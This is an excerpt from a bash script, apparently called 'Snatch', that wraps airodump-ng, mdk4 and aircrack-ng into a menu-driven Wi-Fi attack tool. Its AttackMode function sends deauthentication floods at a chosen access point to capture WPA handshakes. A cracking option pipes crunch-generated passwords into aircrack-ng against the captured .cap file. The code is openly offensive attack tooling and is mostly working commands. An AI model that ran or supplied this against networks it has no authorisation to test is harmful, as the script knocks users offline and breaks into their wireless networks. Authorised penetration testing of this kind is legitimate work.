...
splash(){
	echo -e " "
	echo -e "\e[36m  _____ ____    ____  ______   __  __ __\e[0m"
	sleep 0.15	
	echo -e "\e[36m / ___/|    \  /    ||      | /  ]|  |  |\e[0m"
	sleep 0.15	
	echo -e "\e[36m(   \_ |  _  ||  o  ||      |/  / |  |  |\e[0m"
	sleep 0.15	
	echo -e "\e[36m \__  ||  |  ||     ||_|  |_/  /  |  _  |\e[0m"
	sleep 0.15	
	echo -e "\e[36m /  \ ||  |  ||  _  |  |  |/   \_ |  |  |\e[0m"
	sleep 0.15
	echo -e "\e[36m \    ||  |  ||  |  |  |  |\     ||  |  |\e[0m"
	sleep 0.15
	echo -e "\e[36m  \___||__|__||__|__|  |__| \____||__|__|\e[0m"
	sleep 0.15
	echo -e "==============================================================="                                           
...
credits(){
	...
	sleep 0.15
	echo -e " "
	echo -e "\e[35mCreated June 2019\e[0m"
	sleep 0.15
	echo -e " "
	echo -e "\e[35mWeb URL: http://www.majikcat.com\e[0m"
	sleep 0.15
	...
	sleep 0.15
	echo -e " "
	echo -e "\e[36mDonatations accepted via paypal - using email rjlemail@gmail.com\e[0m"
	sleep 0.15
	echo -e "\e[35mThis program utilizes mdk4, aircrack-ng, and TX Power Blast.\e[0m"
	sleep 3.0
}
...
AttackMode(){
	...
	xterm -hold -e airodump-ng --bssid $bssid $lanmon &
	iwconfig $wlan channel $chan
	xterm -hold -e mdk4 $lanmon d -B $bssid -c $chan
	echo -e "\e[37mWhen you see a handshake appear Ctrl+c and close the terminal popup window.\e[0m"
	echo -e "\e[37mA *.cap file will be saved in the snatch folder.\e[0m"
}
...
#=======================================================================
		...
		"Scan for Target")
			...
			xterm -hold -e airodump-ng $lanmon &
			sleep 3 
			clear
		break
		;;
...
#=======================================================================
		...
		"Crack Password - Special")
			clear
			splash
			echo -e "Enter the exact path to your wordlist"
			echo -e "(ie. /home/charlie/wordlist/rockyou.txt)"
			read wordlist
			echo -e " "
			sleep 0.15
			echo -e "Enter the exact path to your *.cap file"
			echo -e "(ie. /home/charlie/exploits/snatch/somenamehere.cap)"
			read capfile
			echo -e " "
			sleep 0.15
			...
			read max
			sleep 0.15
			xterm -hold -e crunch $min $max $specialchars | aircrack-ng $capfile --bssid $bssid -w- &
			sleep 1.5
		break
		;;
